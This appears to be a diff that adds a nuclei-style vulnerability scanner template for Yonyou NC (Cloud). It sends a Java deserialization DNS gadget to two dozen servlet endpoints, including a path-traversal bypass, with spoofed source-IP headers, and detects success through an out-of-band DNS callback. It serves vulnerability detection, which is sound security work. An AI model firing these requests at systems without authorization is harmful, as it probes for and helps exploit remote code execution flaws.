@@ -1,0 +1,58 @@
+id: yonyou-nc-deserialization-check-dns
+
+info:
+  name: 用友NC (Cloud) 反序列化接口检测 DNS利用链
+  author: SleepingBag945
+  severity: critical
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
+        Connection: close
+        X-Forwarded-For: 127.0.0.10
+        X-Originating-IP: 127.0.0.10
+        X-Remote-Addr: 127.0.0.10
+        X-Remote-IP: 127.0.0.10
+        Accept-Encoding: gzip
+        SL-CE-SUID: 126
+
+        {{generate_java_gadget("dns", "http://{{interactsh-url}}", "raw")}}
+
+    payloads:
+      path:
+        - /servlet/~ic/nc.bs.framework.server.ConfigResourceServlet
+        - /servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet
+        - /servlet/~webbd/nc.uap.bs.im.servlet.OAUserAuthenticationServlet
+        - /servlet/~uapbs/files/..;/uap.bs.dc.server.DcUpdateRESTService
+        - /servlet/~webbd/nc.uap.bs.im.servlet.OAContactsFuzzySearchServlet
+        - /servlet/~webbd/nc.uap.bs.im.servlet.OAUserQryServlet
+        - /servlet/~baseapp/nc.impl.pub.filesystem.FileManageServlet
+        - /servlet/~baseapp/nc.message.bs.NCMessageServlet
+        - /servlet/~uapim/nc.bs.pub.im.UserSynchronizationServlet
+        - /servlet/~uapim/nc.bs.pub.im.UserQueryServiceServlet
+        - /servlet/~uapim/nc.bs.pub.im.UserAuthenticationServlet
+        - /servlet/~ecapppub/nc.impl.ecpubapp.filemanager.service.ECFileManageServlet
+        - /servlet/~uapim/nc.bs.pub.im.ContactsQueryServiceServlet
+        - /servlet/~uapim/com.ufida.eip.adaptor.servlet.ServletForESBAdaptor
+        - /servlet/~uapss/uap.framework.rc.controller.ResourceManagerServlet
+        - /servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet
+        - /servlet/mxservlet
+        - /service/~uapss/nc.search.file.parser.FileParserServlet
+        - /servlet/~uapss/com.yonyou.ante.servlet.FileReceiveServlet
+        - /servlet/~aert/com.ufida.zior.console.ActionHandlerServlet
+        - /servlet/~baseapp/nc.document.pub.fileSystem.servlet.DeleteServlet
+        - /servlet/~baseapp/nc.document.pub.fileSystem.servlet.DownloadServlet
+        - /servlet/~baseapp/nc.document.pub.fileSystem.servlet.UploadServlet
+        - /service/~xbrl/XbrlPersistenceServlet
+
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
